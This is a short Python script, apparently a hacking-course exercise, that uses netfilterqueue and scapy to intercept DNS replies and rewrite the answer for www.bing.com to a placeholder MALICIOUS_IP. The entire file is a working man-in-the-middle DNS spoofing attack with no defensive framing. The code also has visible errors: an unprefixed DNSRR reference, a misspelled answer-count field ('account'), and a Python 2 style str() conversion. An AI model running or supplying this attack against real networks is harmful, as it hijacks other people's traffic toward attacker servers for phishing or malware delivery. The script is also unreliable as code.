import netfilterqueue
import scapy.all as scapy 

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(DNSRR):
		qname = scapy_packet[scapy.DNSRR].qname
		if "www.bing.com" in qname:
			print("\n[+] Spoofing target\n")
			answer = scapy.DNSRR(rrname=qname, rdata=MALICIOUS_IP)
			scapy_packet[scapy.DNS].an = answer 
			scapy_packet[scapy.DNS].account = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			
			packet.set_payload(str(scapy_packet))
			
	packet.accept()
	
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
